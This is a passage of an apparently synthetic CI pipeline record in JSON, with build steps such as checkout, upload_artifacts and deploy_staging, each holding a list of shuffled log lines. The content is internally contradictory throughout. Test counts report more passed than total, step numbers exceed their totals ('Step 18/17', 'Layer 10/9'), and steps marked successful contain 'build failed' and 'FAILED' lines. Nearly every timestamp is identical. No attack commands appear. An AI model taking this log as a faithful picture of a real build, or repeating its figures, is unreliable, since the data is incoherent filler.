          "\u2713 build completed",
          "Connecting to acme.corp:443...",
          "Checking out main branch",
          "  PASS: unit/test_cache_hit.spec.js",
          "Bundling vendor.css",
          "Platform: win32-x64",
          "[12:19:13] DEBUG: Initializing service",
          "[12:19:13] DEBUG: Query executed in 46ms",
          "FAILED: test_auth_login",
          "GET /health - 204 (29ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-8154",
          "Pulling image: python:3.11",
          "HEAD is now at 8fbcb89",
          "[12:19:13] DEBUG: Connection pool: 20 active",
          "Transforming 855 files...",
          "Snapshots: 30 passed, 19 total",
          "Artifact downloaded: 10MB",
          "Snapshots: 3 passed, 23 total",
          "[12:19:13] INFO: Connecting to database",
          "Compiling lib/service.java...",
          "HEAD is now at 8b7e943",
          "[12:19:13] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Step 3/15: Running migrations",
          "Ready.",
          "yarn add: Done in 4.38s",
          "yarn add: Done in 26.81s",
          "Cache invalidated: build",
          "\u2713 All checks passed",
          "Creating production build...",
          "Minifying main.js",
          "Test Suites: 27 passed, 11 total",
          "Compiling lib/service.java...",
          "HEAD is now at eebbb9f",
          "pip install: Successfully installed react-2.6",
          "npm notice: created a lockfile",
          "\u2713 Step 'test' succeeded",
          "Time: 117.372s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:13] DEBUG: Memory usage: 566MB",
          "Connection established",
          "Test Suites: 31 passed, 41 total",
          "Done.",
          "[12:19:13] DEBUG: Loading configuration",
          "[12:19:13] INFO: Cache refreshed",
          "Processing...",
          "[12:19:13] WARN: Deprecated API usage",
          "\u2713 Task completed in 978ms",
          "pip: Collecting express",
          "Switched to branch 'feature/task-889'",
          "HEAD is now at 5df1c1c",
          "pip: Installing build dependencies...",
          "[12:19:13] DEBUG: Memory usage: 170MB",
          "Compiling src/utils.go...",
          "\u2713 All checks passed",
          "[12:19:13] DEBUG: Loading configuration",
          "\u2713 Step 'install' succeeded",
          "Optimizing 100 modules...",
          "Fetching submodules...",
          "Step 10/20: Testing",
          "Tests: 274 passed, 445 total",
          "[12:19:13] DEBUG: Loading configuration",
          "pip: Downloading webpack-3.20.tar.gz",
          "Finished.",
          "WARNING: lodash has known vulnerabilities",
          "Installing react@2.7.9",
          "Ready.",
          "Cache restored successfully (203MB)",
          "Platform: win32-x64",
          "Cache invalidated: build",
          "[12:19:13] DEBUG: Connection pool: 14 active",
          "Finished.",
          "[12:19:13] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "npm install: added 440 packages",
          "yarn add: Done in 11.67s",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:19:13] DEBUG: Initializing service",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-19T12:19:27.146390",
        "finished_at": "2025-12-19T12:20:09.617348",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Success!",
          "\u2713 lint completed",
          "[12:19:13] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/app.ts...",
          "npm notice: package.json updated",
          "Pulling image: python:18",
          "\u2713 All checks passed",
          "Environment: test",
          "Using Node.js 20.16.8",
          "Pushing to registry...",
          "Step 18/17: Building",
          "Using Python 3.9",
          "Uploading artifact 'dist' (29 files)",
          "Uploading artifact 'build' (7 files)",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-8265",
          "\u2713 build completed",
          "Compiling utils/index.js...",
          "Generating source maps...",
          "[12:19:13] WARN: Deprecated API usage",
          "\u2713 Step 'build' succeeded",
          "npm install: added 166 packages",
          "Step 10/22: Linting",
          "TLS handshake completed",
          "Image pulled successfully",
          "pip: Downloading express-4.18.tar.gz",
          "Compiling components/index.js...",
          "Fetching submodules...",
          "Success!",
          "Step 7/22: Testing",
          "Ready.",
          "npm notice: package.json updated",
          "Using Python 3.10",
          "Cache miss for key-2702",
          "yarn add: Done in 14.67s",
          "Switched to branch 'feature/task-950'",
          "Artifact uploaded: dist.zip (67MB)",
          "WARNING: react has known vulnerabilities",
          "Image pulled successfully",
          "Pulling image: alpine:18",
          "Compiling src/index.js...",
          "Transforming 532 files...",
          "Cache hit for key-7899",
          "Waiting...",
          "Layer 6/9: RUN command",
          "npm install: resolved 960 packages",
          "[12:19:13] INFO: Connecting to database",
          "\u2713 All checks passed",
          "\u2713 Step 'test' succeeded",
          "Step 20/22: Installing dependencies",
          "Checking out main branch",
          "npm notice: created a lockfile",
          "[12:19:13] DEBUG: Query executed in 9ms",
          "Checking out main branch",
          "WARNING: express has known vulnerabilities",
          "Done.",
          "  PASS: unit/test_auth_login.spec.js",
          "Ran 68 tests in 12s",
          "[12:19:13] DEBUG: Initializing service",
          "Test Suites: 10 passed, 44 total",
          "Switched to branch 'bugfix/task-159'",
          "Tests: 215 passed, 193 total",
          "[12:19:13] DEBUG: Initializing service",
          "pip: Collecting prettier",
          "Already up to date.",
          "WARNING: axios has known vulnerabilities",
          "Ready.",
          "Fetching submodules...",
          "Creating production build...",
          "FAILED: test_db_connect",
          "Switched to branch 'feature/task-371'",
          "Environment: development",
          "Installing prettier@1.6.1",
          "HEAD is now at 3d868d5",
          "Generating source maps...",
          "[12:19:13] DEBUG: Query executed in 17ms",
          "Layer 6/13: COPY command",
          "Cache restored successfully (400MB)",
          "[12:19:13] INFO: Processing request",
          "Uploading artifact 'dist' (7 files)",
          "Image pulled successfully",
          "Success!",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] WARN: Deprecated API usage",
          "Building Docker image...",
          "\u2713 Step 'install' succeeded",
          "\u2717 build failed with exit code 65",
          "Step 20/16: Testing",
          "Image pulled successfully",
          "Using Python 3.12",
          "Step 3/17: Testing",
          "npm install: resolved 274 packages",
          "npm notice: created a lockfile",
          "Platform: darwin-arm64",
          "pip: Collecting webpack",
          "npm notice: package.json updated",
          "Compiling utils/app.ts...",
          "Coverage: 94% statements, 72% branches",
          "npm notice: created a lockfile",
          "Completed.",
          "[12:19:13] DEBUG: Query executed in 49ms",
          "Compiling components/app.ts...",
          "Creating production build...",
          "Switched to branch 'feature/task-734'",
          "Processing...",
          "[12:19:13] INFO: Cache refreshed",
          "[12:19:13] DEBUG: Initializing service",
          "Transforming 297 files...",
          "Using Node.js 19.10.6",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 validate completed",
          "Building Docker image...",
          "Tests: 126 passed, 281 total",
          "Step 9/23: Testing",
          "Already up to date.",
          "Loading...",
          "[12:19:13] DEBUG: Connection pool: 12 active",
          "[12:19:13] DEBUG: Initializing service",
          "Step 12/24: Testing",
          "WARNING: prettier has known vulnerabilities",
          "\u2717 build failed with exit code 2",
          "\u2713 Step 'setup' succeeded",
          "[12:19:13] INFO: Request completed",
          "WARNING: axios has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:13] INFO: Request completed",
          "Processing...",
          "Bundling runtime.js",
          "OK",
          "pip install: Successfully installed lodash-1.18",
          "Installing axios@2.9.6",
          "pip: Collecting webpack",
          "Step 13/17: Installing dependencies",
          "npm notice: created a lockfile",
          "[12:19:13] INFO: Processing request",
          "Image pulled successfully",
          "Switched to branch 'feature/task-678'",
          "Test Suites: 45 passed, 48 total",
          "npm install: added 432 packages",
          "  PASS: e2e/test_db_connect.spec.js",
          "Loading...",
          "Step 10/23: Testing",
          "\u2713 Task completed in 4624ms",
          "Step 11/16: Linting",
          "Test Suites: 36 passed, 12 total",
          "\u2713 Step 'test' succeeded",
          "Test Suites: 37 passed, 9 total",
          "[12:19:13] INFO: Connecting to database",
          "[12:19:13] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:13] INFO: Processing request",
          "Installing eslint@4.18.4",
          "[12:19:13] DEBUG: Memory usage: 513MB",
          "Cache saved successfully",
          "Compiling utils/handler.rs...",
          "Compiling components/service.java...",
          "Already up to date.",
          "[12:19:13] DEBUG: Initializing service",
          "Test Suites: 32 passed, 29 total",
          "OK",
          "Environment: production",
          "Tests: 481 passed, 335 total",
          "[12:19:13] INFO: Request completed",
          "Connecting to example.com:443...",
          "Connecting to acme.corp:443...",
          "Building Docker image...",
          "Cache hit for key-7851",
          "Exception: ValueError",
          "WARNING: axios has known vulnerabilities",
          "[12:19:13] DEBUG: Query executed in 42ms",
          "Optimizing 80 modules...",
          "NODE_ENV=development",
          "Step 1/23: Testing",
          "Step 19/19: Installing dependencies",
          "\u2713 All checks passed",
          "Coverage: 88% statements, 80% branches",
          "Completed.",
          "[12:19:13] DEBUG: Connection pool: 18 active",
          "\u2713 lint completed",
          "GET /health - 201 (13ms)",
          "Compiling lib/app.ts...",
          "Compiling src/service.java...",
          "pip: Installing build dependencies...",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 10/18: Installing dependencies",
          "[12:19:13] INFO: Connecting to database",
          "Success!",
          "Compiling lib/main.py...",
          "HEAD is now at 663ffa5",
          "Cache restored successfully (136MB)",
          "Compiling components/app.ts...",
          "  PASS: unit/test_user_create.spec.js",
          "[12:19:13] INFO: Request completed",
          "[12:19:13] DEBUG: Query executed in 68ms",
          "OK",
          "npm notice: created a lockfile",
          "Loading...",
          "[12:19:13] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out main branch",
          "Cache hit for key-7134",
          "[12:19:13] DEBUG: Loading configuration",
          "Minifying vendor.js",
          "npm notice: package.json updated",
          "Done.",
          "Snapshots: 35 passed, 24 total",
          "Pulling image: node:18",
          "Image pulled successfully",
          "WARNING: react has known vulnerabilities",
          "[12:19:13] DEBUG: Query executed in 63ms",
          "[12:19:13] DEBUG: Loading configuration",
          "Environment: production",
          "[12:19:13] DEBUG: Connection pool: 1 active",
          "WARNING: react has known vulnerabilities",
          "Installing webpack@1.6.0",
          "Pulling image: node:latest",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Generating source maps...",
          "\u2717 build failed with exit code 57",
          "pip install: Successfully installed jest-1.19",
          "Step 11/22: Testing",
          "pip install: Successfully installed prettier-2.10",
          "Cache miss for key-2436",
          "OK",
          "Step 6/23: Deploying",
          "pip: Collecting react",
          "[12:19:13] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:13] INFO: Processing request",
          "pip: Collecting webpack",
          "Compiling components/app.ts...",
          "Step 12/22: Deploying",
          "pip: Collecting eslint",
          "Compiling lib/handler.rs...",
          "[12:19:13] DEBUG: Loading configuration",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-19T12:20:09.617348",
        "finished_at": "2025-12-19T12:20:15.280142",
        "log_lines": [
          "=== Step: checkout ===",
          "Compiling utils/app.ts...",
          "Pulling image: python:3.11",
          "Pushing to registry...",
          "Minifying vendor.js",
          "[12:19:13] DEBUG: Loading configuration",
          "Minifying app.js",
          "Using Node.js 18.16.1",
          "GET /status - 201 (2ms)",
          "Using Node.js 17.1.6",
          "Coverage: 88% statements, 91% branches",
          "Transforming 519 files...",
          "Success!",
          "[12:19:13] DEBUG: Memory usage: 1737MB",
          "pip: Installing build dependencies...",
          "Using Python 3.11",
          "WARNING: jest has known vulnerabilities",
          "[12:19:13] INFO: Connecting to database",
          "[12:19:13] INFO: Cache refreshed",
          "Step 1/19: Running migrations",
          "Snapshots: 39 passed, 13 total",
          "[12:19:13] DEBUG: Memory usage: 699MB",
          "Checking out master branch",
          "Step 7/19: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: created a lockfile",
          "yarn add: Done in 11.28s",
          "Platform: darwin-arm64",
          "Artifact uploaded: dist.zip (99MB)",
          "Cache invalidated: dependencies",
          "Compiling src/app.ts...",
          "HEAD is now at c73594e",
          "Transforming 593 files...",
          "[12:19:13] DEBUG: Query executed in 47ms",
          "Pulling image: node:latest",
          "Verifying...",
          "Step 13/18: Running migrations",
          "\u2713 Task completed in 2661ms",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 build completed",
          "Done.",
          "Connecting to test.io:443...",
          "[12:19:13] INFO: Processing request",
          "POST /data - 201 (64ms)",
          "Building Docker image...",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Step 6/17: Installing dependencies",
          "[12:19:13] DEBUG: Memory usage: 295MB",
          "Connection established",
          "TLS handshake completed",
          "Checking out master branch",
          "Snapshots: 30 passed, 32 total",
          "Ready.",
          "yarn add: Done in 28.69s",
          "Step 15/21: Running migrations",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Cache miss for key-9212",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-318'",
          "[12:19:13] INFO: Starting build process",
          "FAILED: test_cache_hit",
          "Compiling utils/service.java...",
          "[12:19:13] INFO: Processing request",
          "Cache invalidated: dependencies",
          "Platform: darwin-arm64",
          "[12:19:13] DEBUG: Loading configuration",
          "Tests: 459 passed, 221 total",
          "[12:19:13] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (3MB)",
          "[12:19:13] DEBUG: Initializing service",
          "Minifying main.js",
          "Step 14/23: Installing dependencies",
          "Cache saved successfully",
          "Cache invalidated: node_modules",
          "Transforming 443 files...",
          "OK",
          "FAILED: test_db_connect",
          "Using Node.js 20.17.5",
          "Cache restored successfully (33MB)",
          "Optimizing 41 modules...",
          "  PASS: unit/test_auth_login.spec.js",
          "Snapshots: 19 passed, 13 total",
          "[12:19:13] DEBUG: Loading configuration",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/main.py...",
          "TLS handshake completed",
          "Checking out develop branch",
          "HEAD is now at d7611c4",
          "Cache hit for key-8831",
          "Image pulled successfully",
          "Fetching submodules...",
          "Artifact downloaded: 14MB",
          "Test Suites: 10 passed, 5 total",
          "[12:19:13] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Switched to branch 'feature/task-897'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Compiling utils/index.js...",
          "Optimizing 21 modules...",
          "\u2713 Task completed in 1466ms",
          "Uploading artifact 'dist' (36 files)",
          "Artifact uploaded: dist.zip (34MB)",
          "\u2713 Step 'install' succeeded",
          "Processing...",
          "Installing jest@2.14.4",
          "Artifact uploaded: dist.zip (11MB)",
          "WARNING: react has known vulnerabilities",
          "GET /status - 201 (67ms)",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 124",
          "pip: Collecting jest",
          "Loading...",
          "TLS handshake completed",
          "Cache invalidated: node_modules",
          "Waiting...",
          "Connection established",
          "Time: 31.246s",
          "Connection established",
          "Compiling components/index.js...",
          "[12:19:13] INFO: Cache refreshed",
          "Fetching submodules...",
          "[12:19:13] INFO: Processing request",
          "[12:19:13] INFO: Cache refreshed",
          "Compiling src/app.ts...",
          "Compiling lib/main.py...",
          "Time: 46.8s",
          "[12:19:13] DEBUG: Initializing service",
          "Step 14/16: Building",
          "Building Docker image...",
          "Layer 10/9: RUN command",
          "Step 1/20: Deploying",
          "Cache saved successfully",
          "Cache miss for key-3024",
          "[12:19:13] INFO: Connecting to database",
          "Compiling utils/app.ts...",
          "pip install: Successfully installed prettier-5.20",
          "[12:19:13] INFO: Processing request",
          "Time: 39.808s",
          "npm install: resolved 1729 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 13/25: Deploying",
          "  PASS: test_db_connect (76ms)",
          "Connection established",
          "pip: Installing build dependencies...",
          "Ready.",
          "Ran 60 tests in 5s",
          "Compiling utils/utils.go...",
          "Compiling components/index.js...",
          "[12:19:13] WARN: Deprecated API usage",
          "Building Docker image...",
          "WARNING: webpack has known vulnerabilities",
          "Using Python 3.11",
          "Fetching submodules...",
          "pip: Collecting axios",
          "Minifying app.js",
          "\u2713 Task completed in 1682ms",
          "npm install: resolved 231 packages",
          "Cache miss for key-2977",
          "Optimizing 56 modules...",
          "WARNING: react has known vulnerabilities",
          "Creating production build...",
          "Uploading artifact 'coverage' (24 files)",
          "Step 4/17: Building",
          "[12:19:13] DEBUG: Query executed in 35ms",
          "Cache invalidated: node_modules",
          "  PASS: e2e/test_user_create.spec.js",
          "Compiling lib/index.js...",
          "Step 4/17: Installing dependencies",
          "[12:19:13] DEBUG: Memory usage: 533MB",
          "Coverage: 98% statements, 75% branches",
          "Environment: test",
          "yarn add: Done in 16.3s",
          "Test Suites: 30 passed, 23 total",
          "Finished.",
          "Using Python 3.12",
          "Compiling components/main.py...",
          "Switched to branch 'bugfix/task-904'",
          "Verifying...",
          "Cache saved successfully",
          "[12:19:13] WARN: Deprecated API usage",
          "Already up to date.",
          "[12:19:13] INFO: Cache refreshed",
          "Completed.",
          "Compiling components/index.js...",
          "Time: 88.292s",
          "Cache invalidated: node_modules",
          "  PASS: unit/test_user_create.spec.js",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Coverage: 77% statements, 73% branches",
          "[12:19:13] INFO: Cache refreshed",
          "OK",
          "Processing...",
          "pip: Downloading axios-1.9.tar.gz",
          "Waiting...",
          "Artifact uploaded: dist.zip (33MB)",
          "Completed.",
          "\u2713 Step 'build' succeeded",
          "Connecting to acme.corp:443...",
          "npm install: resolved 1548 packages",
          "Loading...",
          "Done.",
          "NODE_ENV=test",
          "Bundling main.css",
          "[12:19:13] DEBUG: Loading configuration",
          "Completed.",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: dist.zip (51MB)",
          "Building Docker image...",
          "[12:19:13] DEBUG: Loading configuration",
          "npm install: resolved 709 packages",
          "Connecting to cloud.services:443...",
          "Installing axios@5.20.3",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Minifying app.js",
          "Compiling src/handler.rs...",
          "Cache restored successfully (363MB)",
          "Bundling runtime.js",
          "Platform: linux-x64",
          "[12:19:13] DEBUG: Query executed in 81ms",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] DEBUG: Initializing service",
          "Installing prettier@5.11.3",
          "\u2713 Step 'test' succeeded",
          "Completed.",
          "Image pulled successfully",
          "\u2713 test completed",
          "Minifying vendor.js",
          "npm notice: package.json updated",
          "Cache hit for key-7432",
          "OK",
          "[12:19:13] ERROR: Connection failed",
          "Compiling utils/index.js...",
          "Compiling components/index.js...",
          "yarn add: Done in 22.48s",
          "Loading...",
          "Snapshots: 34 passed, 39 total",
          "Optimizing 69 modules...",
          "\u2713 build completed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-19T12:20:15.280142",
        "finished_at": "2025-12-19T12:20:29.437128",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "OK",
          "[12:19:13] INFO: Connecting to database",
          "TLS handshake completed",
          "Transforming 431 files...",
          "WARNING: jest has known vulnerabilities",
          "Layer 3/9: RUN command",
          "[12:19:13] DEBUG: Connection pool: 19 active",
          "Snapshots: 45 passed, 13 total",
          "Minifying main.js",
          "Tests: 251 passed, 80 total",
          "Cache invalidated: dependencies",
          "[12:19:13] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing jest@3.10.9",
          "Step 14/16: Running migrations",
          "Layer 10/14: RUN command",
          "Ready.",
          "npm install: resolved 777 packages",
          "Step 17/25: Linting",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:13] INFO: Cache refreshed",
          "Compiling lib/utils.go...",
          "[12:19:13] DEBUG: Connection pool: 5 active",
          "[12:19:13] WARN: Deprecated API usage",
          "Already up to date.",
          "HEAD is now at bc55c13",
          "Finished.",
          "Connecting to cloud.services:443...",
          "Creating production build...",
          "Tests: 414 passed, 89 total",
          "Cache invalidated: build",
          "Generating source maps...",
          "[12:19:13] INFO: Request completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:13] WARN: Deprecated API usage",
          "Cache hit for key-8162",
          "[12:19:13] DEBUG: Loading configuration",
          "Success!",
          "Checking out develop branch",
          "Exception: ValueError",
          "pip install: Successfully installed axios-4.9",
          "Verifying...",
          "Platform: darwin-arm64",
          "[12:19:13] DEBUG: Memory usage: 1163MB",
          "Using Python 3.9",
          "Completed.",
          "yarn add: Done in 25.5s",
          "[12:19:13] INFO: Request completed",
          "Exception: TypeError",
          "Minifying vendor.js",
          "[12:19:13] INFO: Cache refreshed",
          "Pushing to registry...",
          "TLS handshake completed",
          "npm install: added 391 packages",
          "Step 18/24: Installing dependencies",
          "Ran 117 tests in 32s",
          "Transforming 969 files...",
          "Uploading artifact 'build' (19 files)",
          "Connecting to acme.corp:443...",
          "[12:19:13] DEBUG: Connection pool: 2 active",
          "Using Node.js 17.9.5",
          "Checking out main branch",
          "Minifying app.js",
          "Cache hit for key-4401",
          "Step 6/19: Installing dependencies",
          "Cache hit for key-1424",
          "Already up to date.",
          "Building Docker image...",
          "[12:19:13] DEBUG: Query executed in 65ms",
          "Waiting...",
          "[12:19:13] INFO: Request completed",
          "Success!",
          "POST /data - 201 (421ms)",
          "Environment: production",
          "Cache miss for key-8133",
          "Already up to date.",
          "Step 3/22: Testing",
          "\u2713 lint completed",
          "[12:19:13] INFO: Processing request",
          "HEAD is now at b667836",
          "Cache saved successfully",
          "Generating source maps...",
          "Image pulled successfully",
          "Pushing to registry...",
          "Coverage: 82% statements, 99% branches",
          "Checking out master branch",
          "pip install: Successfully installed eslint-5.11",
          "Step 7/18: Building",
          "Cache hit for key-1790",
          "Layer 2/13: RUN command",
          "\u2713 Step 'test' succeeded",
          "Cache restored successfully (255MB)",
          "[12:19:13] DEBUG: Query executed in 100ms",
          "Checking out main branch",
          "[12:19:13] WARN: Deprecated API usage",
          "Artifact downloaded: 10MB",
          "OK",
          "Tests: 167 passed, 215 total",
          "Step 5/23: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:19:13] DEBUG: Loading configuration",
          "WARNING: prettier has known vulnerabilities",
          "Step 15/16: Deploying",
          "Compiling utils/handler.rs...",
          "[12:19:13] INFO: Request completed",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_user_create (28ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/service.java...",
          "[12:19:13] INFO: Request completed",
          "Transforming 772 files...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling utils/handler.rs...",
          "yarn add: Done in 16.42s",
          "[12:19:13] ERROR: Connection failed",
          "Minifying main.js",
          "Image pulled successfully",
          "[12:19:13] WARN: Deprecated API usage",
          "Processing...",
          "\u2717 build failed with exit code 65",
          "  PASS: test_api_health (372ms)",
          "[12:19:13] INFO: Processing request",
          "Compiling utils/service.java...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "Processing...",
          "Cache saved successfully",
          "pip: Collecting lodash",
          "[12:19:13] INFO: Connecting to database",
          "[12:19:13] DEBUG: Initializing service",
          "Building Docker image...",
          "Cache restored successfully (285MB)",
          "\u2717 build failed with exit code 124",
          "Ran 28 tests in 26s",
          "Building Docker image...",
          "Processing...",
          "pip: Collecting jest",
          "[12:19:13] INFO: Cache refreshed",
          "[12:19:13] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "NODE_ENV=development",
          "HEAD is now at d6bced0",
          "Compiling src/service.java...",
          "Installing lodash@3.2.10",
          "Step 1/24: Running migrations",
          "Finished.",
          "Bundling vendor.js",
          "\u2713 build completed",
          "OK",
          "Compiling components/service.java...",
          "Completed.",
          "Bundling runtime.js",
          "Step 10/21: Deploying",
          "Snapshots: 33 passed, 50 total",
          "Compiling src/handler.rs...",
          "Installing lodash@4.16.0",
          "Bundling main.js",
          "Connecting to acme.corp:443...",
          "Success!",
          "Layer 5/9: ENV command",
          "Minifying vendor.js",
          "WARNING: jest has known vulnerabilities",
          "TLS handshake completed",
          "[12:19:13] DEBUG: Initializing service",
          "\u2717 build failed with exit code 44",
          "Artifact downloaded: 10MB",
          "Switched to branch 'feature/task-654'",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/17: Installing dependencies",
          "  PASS: e2e/test_auth_login.spec.js",
          "NODE_ENV=production",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "Step 15/22: Building",
          "Checking out master branch",
          "pip: Installing build dependencies...",
          "Step 13/22: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "WARNING: axios has known vulnerabilities",
          "[12:19:13] DEBUG: Initializing service",
          "Compiling src/handler.rs...",
          "Pushing to registry...",
          "NODE_ENV=production",
          "Artifact downloaded: 8MB",
          "pip: Collecting jest",
          "Cache saved successfully",
          "Tests: 294 passed, 158 total",
          "Pushing to registry...",
          "Step 5/24: Installing dependencies",
          "Exception: RuntimeError",
          "Done.",
          "Step 1/16: Deploying",
          "Image pulled successfully",
          "Exception: RuntimeError",
          "Success!",
          "Snapshots: 30 passed, 13 total",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Cache invalidated: build",
          "Time: 38.805s",
          "Using Node.js 18.7.6",
          "Layer 6/12: COPY command",
          "Exception: RuntimeError",
          "Environment: development",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Tests: 330 passed, 199 total",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact downloaded: 2MB",
          "[12:19:13] DEBUG: Loading configuration",
          "OK",
          "GET /status - 200 (97ms)",
          "\u2713 All checks passed",
          "Using Python 3.10",
          "FAILED: test_auth_login",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 894 files...",
          "OK",
          "Using Python 3.10",
          "Coverage: 93% statements, 74% branches",
          "Ready.",
          "Using Python 3.9",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:13] INFO: Starting build process",
          "\u2717 build failed with exit code 65",
          "Optimizing 19 modules...",
          "Cache invalidated: node_modules",
          "FAILED: test_cache_hit",
          "WARNING: axios has known vulnerabilities",
          "OK",
          "Cache restored successfully (261MB)",
          "Done.",
          "[12:19:13] DEBUG: Initializing service",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-19T12:20:29.437128",
        "finished_at": "2025-12-19T12:20:43.594114",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Completed.",
          "Using Python 3.11",
          "[12:19:13] INFO: Cache refreshed",
          "yarn add: Done in 16.93s",
          "Cache restored successfully (37MB)",
          "Waiting...",
          "[12:19:13] INFO: Request completed",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (7MB)",
          "Connection established",
          "npm notice: package.json updated",
          "pip install: Successfully installed webpack-2.1",
          "Step 10/16: Running migrations",
          "Step 12/25: Installing dependencies",
          "Fetching submodules...",
          "Platform: win32-x64",
          "Cache hit for key-3908",
          "[12:19:13] DEBUG: Connection pool: 19 active",
          "Building Docker image...",
          "Bundling main.css",
          "[12:19:13] DEBUG: Memory usage: 295MB",
          "Switched to branch 'bugfix/task-388'",
          "Compiling components/main.py...",
          "Cache hit for key-2127",
          "pip: Downloading jest-2.17.tar.gz",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 89% statements, 94% branches",
          "[12:19:13] DEBUG: Initializing service",
          "Processing...",
          "Platform: darwin-arm64",
          "Finished.",
          "WARNING: prettier has known vulnerabilities",
          "pip: Collecting lodash",
          "Cache hit for key-5153",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: express has known vulnerabilities",
          "[12:19:13] DEBUG: Loading configuration",
          "Cache hit for key-2195",
          "Generating source maps...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Connecting to example.com:443...",
          "Completed.",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] DEBUG: Initializing service",
          "Done.",
          "pip: Installing build dependencies...",
          "npm install: resolved 1128 packages",
          "Generating source maps...",
          "[12:19:13] INFO: Connecting to database",
          "Cache hit for key-6628",
          "[12:19:13] WARN: Deprecated API usage",
          "Ready.",
          "Done.",
          "[12:19:13] INFO: Connecting to database",
          "[12:19:13] DEBUG: Query executed in 98ms",
          "\u2713 Task completed in 4871ms",
          "\u2713 package completed",
          "Already up to date.",
          "NODE_ENV=development",
          "Test Suites: 43 passed, 31 total",
          "Installing axios@1.7.8",
          "Snapshots: 3 passed, 48 total",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed axios-4.1",
          "Transforming 507 files...",
          "Using Node.js 19.7.2",
          "Platform: linux-x64",
          "pip: Downloading axios-5.18.tar.gz",
          "Step 1/25: Installing dependencies",
          "Minifying app.js",
          "Switched to branch 'bugfix/task-236'",
          "Uploading artifact 'dist' (47 files)",
          "WARNING: jest has known vulnerabilities",
          "Tests: 430 passed, 166 total",
          "Compiling src/app.ts...",
          "Environment: production",
          "GET /health - 204 (86ms)",
          "TLS handshake completed",
          "WARNING: react has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "Step 9/20: Linting",
          "Artifact downloaded: 22MB",
          "Minifying app.js",
          "Snapshots: 28 passed, 6 total",
          "pip install: Successfully installed jest-5.20",
          "HEAD is now at 85a8523",
          "Verifying...",
          "Pushing to registry...",
          "Optimizing 37 modules...",
          "Snapshots: 28 passed, 18 total",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Creating production build...",
          "[12:19:13] DEBUG: Query executed in 45ms",
